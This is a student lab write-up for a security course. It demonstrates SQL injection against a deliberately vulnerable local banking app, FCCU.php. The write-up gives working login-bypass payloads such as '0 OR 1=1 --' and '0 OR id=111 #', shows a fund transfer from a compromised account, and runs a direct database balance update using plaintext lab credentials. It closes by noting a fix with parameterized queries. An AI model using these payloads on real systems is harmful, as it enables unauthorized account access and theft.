Exploit Transcript – FCCU SQL Injection Lab
CSCI 493-81, Lab 10
Date: 05.02.2025
Group: Evan Lu, Baolin Chang, David Xiao, Grullon Gregory

---

Objective:
Demonstrate SQL Injection vulnerabilities in FCCU.php, a vulnerable banking web application, by gaining unauthorized access, transferring funds, and updating balances using crafted inputs.

---

Q1: Show how you can log into an account without knowing any ID numbers ahead of time.

1. Open a browser on your local machine.
2. Navigate to: [http://localhost:8118/cgi-bin/FCCU.php](http://localhost:8118/cgi-bin/FCCU.php)
3. In the "Account ID" field, enter:
   0 OR 1=1 --
4. In the "Password" field, enter any dummy value (e.g., `test`)
5. Click the "Login" button.

Expected behavior from FCCU.php:
\$query = "SELECT \* FROM accounts WHERE id = \$id AND password = '\$password'";

Your input becomes:
SELECT \* FROM accounts WHERE id = 0 OR 1=1 -- AND password = 'test'

This bypasses authentication and logs you into the first account (e.g., Camille Cantu).

---

Q2: Show how you can log into *every* account without knowing any particular ID numbers ahead of time.

1. Visit [http://localhost:8118/cgi-bin/FCCU.php](http://localhost:8118/cgi-bin/FCCU.php)
2. In the "Account ID" field, enter:
   1 --           → then try 2 --, 3 --, etc.
3. In the "Password" field, enter any text.
4. Click "Login".
5. Repeat until successful login.
6. Log each success to identify valid account IDs.

Explanation:
This approach bypasses the password clause using SQL comments (`--`), and brute-forces valid IDs by trial.

---

Q3: Wire full balance from a compromised account to bank routing 314159265 and account 271828182845.

1. Go to [http://localhost:8118/cgi-bin/FCCU.php](http://localhost:8118/cgi-bin/FCCU.php)
2. In the "Account ID" field, enter:
   0 OR id=111 #
3. In the "Password" field, enter: (leave blank)
4. Click "Login".
5. On the transfer form:

   * Routing Number: 314159265
   * Account Number: 271828182845
   * Amount: \[whatever the full balance is shown — e.g., 1389]
6. Click "Wire Money".

Explanation:
The ID poisoning (`0 OR id=111 #`) causes all subsequent SQL queries, including those inside `wire_funds()`, to use ID=111, bypassing password checks at all levels.

---

Q4: Explain why you can't create a new account or arbitrarily update balances (or show that you can).

 Update Balance — Possible

1. Log in using:
   ID: 0 OR id=111 #
2. Access MariaDB using:
   mysql -ufccu -pfccubucks
3. Run:
   UPDATE accounts SET bal = 2000 WHERE id = 111;
4. Refresh FCCU — the new balance will show.

 Create New Account — Not Possible

* FCCU.php contains no INSERT queries
* HTML form does not offer any "Register" or "New Account" input
* mysqli in PHP doesn't allow multiple statements, so `'; INSERT INTO...` won't execute

So INSERT injection is impossible within the current app structure.

---

Q5: Estimate how much time you spent on this lab (all 3 parts).

* Environment setup and port forwarding: 1.5 hrs
* Code review and exploit testing: 3 hrs
* Writing and validating injection attacks: 2 hrs
* Documentation and patching: 1.5 hrs
  → Total: \~8 hours

---

Final Notes:

* SQL Injection vulnerability fixed in our FCCU.php using `mysqli_prepare`, `bind_param`, and parameterized queries.
* A patch file and 1-page memo explaining the fix are included in our submission.

End of Transcript
